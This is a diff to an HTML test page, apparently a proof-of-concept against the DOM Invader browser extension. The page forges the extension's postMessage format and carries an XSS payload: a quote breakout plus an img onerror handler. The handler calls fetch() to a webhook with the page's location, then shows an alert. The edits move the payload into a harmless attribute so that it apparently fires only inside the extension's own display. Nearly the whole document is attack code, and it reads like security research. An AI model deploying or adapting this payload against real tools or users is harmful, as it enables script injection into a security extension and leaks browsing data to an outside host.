@@ -6,7 +6,7 @@
 <body style="background:#111;color:#0f0;text-align:center;padding-top:100px;font-family:sans-serif;">
     
     <h1>[ DOM Invader - Clean Test ]</h1>
-    <p>No DOM injection. Only postMessage.</p>
+    <p>Safe sink + postMessage only</p>
 
     <button onclick="trigger()" style="padding:15px 30px;font-size:18px;">
         SEND MESSAGE
@@ -22,29 +22,32 @@
             document.getElementById('status').innerText =
                 "Message sent. Check DOM Invader.";
 
+            // payload مش هيتنفذ في الصفحة
             const payload = (field) => `
 '); <img src=x onerror="
-fetch('${webhook}?field=${field}&loc=' + encodeURIComponent(window.location.href) + '&origin=' + encodeURIComponent(window.origin), {mode:'no-cors'});
-
-alert(
-'Execution Detected\\n\\n' +
-'Field: ${field}\\n' +
-'Location: ' + window.location.href + '\\n' +
-'Origin: ' + window.origin
-);
+fetch('${webhook}?field=${field}&loc=' + encodeURIComponent(window.location.href), {mode:'no-cors'});
+alert('Execution via: ${field}\\n' + window.location.href);
 "> //`;
 
+            // ✅ safe sink (مش بيشغل JS)
+            const el = document.createElement("div");
+            el.setAttribute("data-test", payload("ATTRIBUTE_SINK"));
+
+            // 👇 DOM Invader هيشوف ده كـ sink
+            document.body.appendChild(el);
+
+            // 👇 الرسالة للـ extension
             window.postMessage({
                 source: "dom-invader",
                 type: "augmented-dom",
                 data: {
-                    sink: "innerHTML",
+                    sink: "attribute",
                     value: payload("VALUE"),
                     stackTrace: payload("STACK_TRACE")
                 }
             }, "*");
 
-            console.log("postMessage sent. No local execution.");
+            console.log("Safe sink triggered. No execution in page.");
         }
     </script>
 
